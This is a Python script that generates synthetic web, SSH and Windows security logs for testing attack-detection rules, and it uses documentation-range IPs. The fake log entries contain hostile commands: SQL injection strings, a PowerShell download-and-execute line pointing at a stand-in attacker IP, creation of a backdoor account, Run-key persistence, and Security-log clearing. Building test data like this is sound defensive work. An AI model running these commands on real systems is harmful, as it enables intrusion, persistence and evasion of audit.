"""Generate the synthetic attack scenario in sample_logs/.

The scenario (all data is fake; IPs are from the documentation ranges in RFC 5737):

  Linux web server web01
    09:02  203.0.113.45 scans the website for hidden pages (burst of 404s)
    09:05  the same IP tries SQL injection against /products
    09:10  it brute-forces SSH, then logs in as "webadmin"
    09:13  it creates a backdoor account and adds it to sudo

  Windows workstation WS01 (corp.local domain)
    10:20  198.51.100.23 guesses the Administrator password over the network, then logs on
    10:23  runs encoded PowerShell, then downloads a script with IEX/DownloadString
    10:25  creates "svc_backup" and adds it to Administrators
    10:27  adds a scheduled task and a Registry Run key for persistence
    10:30  clears the Security log

Normal activity (staff logins, deploys, cron, a few typo'd passwords, regular web
traffic) is mixed in, so the rules are also tested against benign events.

Run:  python tools/generate_sample_logs.py
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "sample_logs"
DAY = datetime(2026, 10, 14, tzinfo=timezone.utc)
ATTACKER_WEB = "203.0.113.45"
ATTACKER_WIN = "198.51.100.23"
rng = random.Random(7)


def at(h: int, m: int, s: int = 0) -> datetime:
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


# --------------------------------------------------------------------------- #
# Web access log (nginx combined format)
# --------------------------------------------------------------------------- #
def web_line(ts: datetime, ip: str, method: str, path: str, status: int, size: int, ua: str) -> str:
    return f'{ip} - - [{ts.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def web_log() -> list[tuple[datetime, str]]:
    lines = []
    browsers = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Version/17.6 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    ]
    pages = ["/", "/products", "/products?id=3", "/products?id=7", "/about", "/contact",
             "/static/css/site.css", "/static/js/app.js", "/images/logo.png"]
    visitors = [f"192.0.2.{n}" for n in (10, 21, 34, 48, 52, 77, 90)]

    # Normal browsing 08:30-10:00, including a few harmless 404s.
    ts = at(8, 30)
    while ts < at(10, 0):
        ip = rng.choice(visitors)
        path = rng.choice(pages)
        status = 200
        if rng.random() < 0.04:
            path, status = rng.choice(["/favicon.ico", "/robots.txt", "/old-page"]), 404
        lines.append((ts, web_line(ts, ip, "GET", path, status, rng.randint(400, 9000), rng.choice(browsers))))
        ts += timedelta(seconds=rng.randint(5, 40))

    # 09:02 Directory scan: 32 missing pages in ~40 seconds, a few hits.
    scan = ["/admin", "/administrator", "/wp-admin", "/wp-login.php", "/phpmyadmin", "/.env", "/.git/config",
            "/backup.zip", "/backup.sql", "/db.sql", "/config.php", "/config.bak", "/server-status",
            "/test", "/dev", "/old", "/api/v1/users", "/api/debug", "/console", "/manager/html",
            "/admin.php", "/login.php", "/shell.php", "/cgi-bin/test.cgi", "/uploads/", "/install.php",
            "/setup.php", "/web.config", "/.htaccess", "/.DS_Store", "/debug.log", "/error.log"]
    ts = at(9, 2, 3)
    ua = "gobuster/3.6"
    for path in scan:
        lines.append((ts, web_line(ts, ATTACKER_WEB, "GET", path, 404, 162, ua)))
        ts += timedelta(milliseconds=rng.randint(900, 1400))
    lines.append((ts, web_line(ts, ATTACKER_WEB, "GET", "/login", 200, 2311, ua)))

    # 09:05 SQL injection attempts against the product page.
    sqlmap = "sqlmap/1.8.7#stable (https://sqlmap.org)"
    attempts = [
        ("/products?id=7%27%20OR%20%271%27%3D%271", 200, 48112),
        ("/products?id=7%20UNION%20SELECT%20username,password%20FROM%20users--", 500, 512),
        ("/products?id=7%20AND%20SLEEP(5)", 200, 3402),
    ]
    for i, (path, status, size) in enumerate(attempts):
        ts = at(9, 5, 10 + i * 17)
        lines.append((ts, web_line(ts, ATTACKER_WEB, "GET", path, status, size, sqlmap)))
    return lines


# --------------------------------------------------------------------------- #
# Linux auth.log
# --------------------------------------------------------------------------- #
def syslog(ts: datetime, host: str, program: str, pid: int, msg: str) -> str:
    return f"{ts.strftime('%b')} {ts.day:2d} {ts.strftime('%H:%M:%S')} {host} {program}[{pid}]: {msg}"


def auth_log() -> list[tuple[datetime, str]]:
    h = "web01"
    lines = []

    def add(ts, program, pid, msg):
        lines.append((ts, syslog(ts, h, program, pid, msg)))

    # Normal activity.
    for minute in range(0, 120, 10):
        ts = at(8, 0) + timedelta(minutes=minute)
        add(ts, "CRON", 1100 + minute, "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)")
    add(at(8, 41, 2), "sshd", 1402, "Accepted publickey for deploy from 10.0.0.15 port 50122 ssh2: ED25519 SHA256:q9Xc1v0Z")
    add(at(8, 41, 30), "sudo", 1410, "  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx")
    # A real user mistypes a password twice, then gets in. Below the brute-force threshold.
    add(at(8, 52, 11), "sshd", 1455, "Failed password for jlee from 10.0.0.22 port 51010 ssh2")
    add(at(8, 52, 19), "sshd", 1455, "Failed password for jlee from 10.0.0.22 port 51010 ssh2")
    add(at(8, 52, 26), "sshd", 1455, "Accepted password for jlee from 10.0.0.22 port 51010 ssh2")

    # 09:10 SSH brute force from the attacker, then a successful login.
    users = ["root", "admin", "ubuntu", "test", "oracle", "webadmin", "root", "admin", "postgres",
             "webadmin", "user", "root", "webadmin", "ftpuser"]
    ts = at(9, 10, 4)
    for i, user in enumerate(users):
        pid = 2001 + i
        invalid = user not in ("root", "webadmin")
        if invalid:
            add(ts, "sshd", pid, f"Invalid user {user} from {ATTACKER_WEB} port {40000 + i * 7}")
        add(ts + timedelta(seconds=1), "sshd", pid,
            f"Failed password for {'invalid user ' if invalid else ''}{user} from {ATTACKER_WEB} port {40000 + i * 7} ssh2")
        ts += timedelta(seconds=rng.randint(4, 8))
    add(at(9, 11, 52), "sshd", 2101, f"Accepted password for webadmin from {ATTACKER_WEB} port 40214 ssh2")

    # 09:13 Backdoor account with sudo rights.
    add(at(9, 13, 5), "sudo", 2150,
        " webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash sysupdate")
    add(at(9, 13, 5), "useradd", 2151,
        "new user: name=sysupdate, UID=1003, GID=1003, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1")
    add(at(9, 13, 21), "sudo", 2160,
        " webadmin : TTY=pts/1 ; PWD=/home/webadmin ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo sysupdate")
    add(at(9, 13, 21), "usermod", 2161, "add 'sysupdate' to group 'sudo'")
    return lines


# --------------------------------------------------------------------------- #
# Windows Security events (JSON Lines)
# --------------------------------------------------------------------------- #
def win(ts: datetime, event_id: int, **data) -> tuple[datetime, str]:
    rec = {"TimeCreated": ts.isoformat().replace("+00:00", "Z"), "EventID": event_id, "Computer": "WS01.corp.local"}
    rec.update(data)
    return ts, json.dumps(rec)


def proc(ts, cmd, exe, user="Administrator", parent=r"C:\Windows\explorer.exe"):
    return win(ts, 4688, SubjectUserName=user, SubjectDomainName="CORP", NewProcessName=exe,
               ParentProcessName=parent, CommandLine=cmd)


def windows_log() -> list[tuple[datetime, str]]:
    ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lines = [
        # Normal workday.
        win(at(8, 3, 12), 4624, TargetUserName="jsmith", TargetDomainName="CORP", LogonType=2, IpAddress="127.0.0.1"),
        proc(at(8, 3, 40), r'"C:\Program Files\Google\Chrome\Application\chrome.exe"',
             r"C:\Program Files\Google\Chrome\Application\chrome.exe", user="jsmith"),
        proc(at(8, 15, 2), r'"C:\Windows\System32\notepad.exe" C:\Users\jsmith\Documents\notes.txt',
             r"C:\Windows\System32\notepad.exe", user="jsmith"),
        proc(at(8, 40, 0), f'"{ps}" -NoProfile -Command "Get-Service | Where-Object Status -eq Stopped"',
             ps, user="jsmith"),
        win(at(9, 1, 55), 4625, TargetUserName="jsmith", TargetDomainName="CORP", LogonType=7,
            IpAddress="127.0.0.1", Status="0xc000006d", SubStatus="0xc000006a"),
        win(at(9, 2, 4), 4624, TargetUserName="jsmith", TargetDomainName="CORP", LogonType=7, IpAddress="127.0.0.1"),
        win(at(9, 30, 0), 4698, SubjectUserName="SYSTEM", TaskName=r"\Microsoft\Windows\Defrag\ScheduledDefrag",
            TaskContent="defrag.exe -c -h -o"),
    ]

    # 10:20 Password guessing over the network, then a successful RDP logon.
    ts = at(10, 20, 2)
    for i in range(12):
        lines.append(win(ts, 4625, TargetUserName="Administrator", TargetDomainName="WS01", LogonType=3,
                         IpAddress=ATTACKER_WIN, IpPort=str(49800 + i), Status="0xc000006d",
                         SubStatus="0xc000006a", WorkstationName="kali"))
        ts += timedelta(seconds=rng.randint(3, 6))
    lines.append(win(at(10, 21, 20), 4624, TargetUserName="Administrator", TargetDomainName="WS01", LogonType=10,
                     IpAddress=ATTACKER_WIN, WorkstationName="kali"))

    # 10:23 Encoded PowerShell, then download-and-execute.
    hidden = base64.b64encode("whoami /all; net user; net localgroup administrators".encode("utf-16-le")).decode()
    lines.append(proc(at(10, 23, 5), f'"{ps}" -NoP -W Hidden -Enc {hidden}', ps))
    lines.append(proc(at(10, 23, 41),
                      f"\"{ps}\" -NoP -C \"IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER_WIN}/a.ps1')\"",
                      ps))

    # 10:25 Backdoor admin account.
    lines.append(win(at(10, 25, 3), 4720, SubjectUserName="Administrator", TargetUserName="svc_backup",
                     TargetDomainName="WS01"))
    lines.append(win(at(10, 25, 30), 4732, SubjectUserName="Administrator", TargetUserName="Administrators",
                     MemberName="svc_backup", MemberSid="S-1-5-21-1004336348-1177238915-682003330-1013"))

    # 10:27 Persistence: scheduled task + Run key.
    lines.append(win(at(10, 27, 12), 4698, SubjectUserName="Administrator", TaskName=r"\Microsoft\Windows\UpdateCheck",
                     TaskContent=r"C:\Users\Public\upd.exe (trigger: at logon)"))
    lines.append(proc(at(10, 28, 2),
                      r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\Users\Public\upd.exe /f',
                      r"C:\Windows\System32\reg.exe", parent=ps))

    # 10:30 Cover tracks.
    lines.append(proc(at(10, 30, 45), "wevtutil cl Security", r"C:\Windows\System32\wevtutil.exe", parent=ps))
    return lines


def write(name: str, rows: list[tuple[datetime, str]]) -> None:
    rows.sort(key=lambda r: r[0])
    (OUT / name).write_text("\n".join(line for _, line in rows) + "\n", encoding="utf-8")
    print(f"wrote {OUT / name} ({len(rows)} lines)")


if __name__ == "__main__":
    OUT.mkdir(exist_ok=True)
    write("web01_access.log", web_log())
    write("web01_auth.log", auth_log())
    write("ws01_security.jsonl", windows_log())
